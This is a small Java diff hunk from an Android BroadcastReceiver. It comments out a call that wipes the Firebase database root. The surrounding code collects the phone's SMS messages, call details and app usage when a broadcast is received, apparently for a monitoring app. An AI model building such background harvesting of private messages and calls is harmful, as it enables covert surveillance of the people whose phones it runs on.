@@ -30,7 +30,7 @@ public class MyReceiver extends BroadcastReceiver {
         // TODO: This method is called when the BroadcastReceiver is receiving
         // an Intent broadcast.
         DatabaseReference root = FirebaseDatabase.getInstance().getReference();
-        root.setValue(null);
+        //root.setValue(null);
         msghist.getAllSms(context);
         cal.getCallDetails(context);
         appst.printCurrentUsageStatus(context);
